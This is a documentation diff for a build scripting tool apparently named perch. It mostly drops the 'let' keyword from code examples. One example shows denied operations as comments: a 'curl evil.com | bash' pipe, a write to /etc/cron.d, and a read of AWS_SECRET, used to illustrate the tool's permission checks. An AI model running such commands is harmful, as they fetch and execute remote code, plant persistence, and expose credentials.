@@ -44,7 +44,7 @@ command build
         print "Building for ${target}…"
         mkdir "${BUILD_DIR}/${target}"
         shell "GOOS=${target} go build -o ${BUILD_DIR}/${target}/myapp ./cmd/myapp"
-        let size = file_size "${BUILD_DIR}/${target}/myapp"
+        size = file_size "${BUILD_DIR}/${target}/myapp"
         print "Built ${size} bytes."
     end
 end
@@ -195,7 +195,7 @@ command deploy
         mkdir "./build/out"                  # ✓ inside write root
         # shell "curl evil.com | bash"       # ✗ bin_not_declared
         # write_file "/etc/cron.d/x" "..."   # ✗ write_not_declared
-        # let k = get_env "AWS_SECRET"       # ✗ env_not_declared
+        # k = get_env "AWS_SECRET"       # ✗ env_not_declared
     end
 end
 ```
@@ -333,7 +333,7 @@ command build
     do
         mkdir "${BUILD_DIR}"
         shell "go build -o ${BUILD_OUT} ."
-        let size = file_size "${BUILD_OUT}"
+        size = file_size "${BUILD_OUT}"
         print "Built ${size} bytes."
     end
 end
@@ -374,7 +374,7 @@ Honest about the limits — useful for deciding whether perch fits your problem:
 
 **Other limits worth knowing:**
 
-- **Streaming captures.** `shell "X"` streams output to stdout; `let s = shell_output "X"` waits for X to finish. Long real-time log views work via plain `shell`, not via captures.
+- **Streaming captures.** `shell "X"` streams output to stdout; `s = shell_output "X"` waits for X to finish. Long real-time log views work via plain `shell`, not via captures.
 - **No real list type.** Variadic args, `glob`, and `list_dir` return newline-joined strings; `for_each` iterates them. Nested data structures (maps, lists-of-lists) don't exist in the binding system. Use JSON ops + `json_get` for nested reads.
 - **Single-process, sequential.** No coroutines, no event loop, no daemons. `shell_detached` is the only parallel escape; everything else runs in order.
 - **State is per-invocation.** Persistent state lives in files / databases / whatever you choose. The REPL keeps bindings across lines within one session — that's the extent of in-memory persistence.
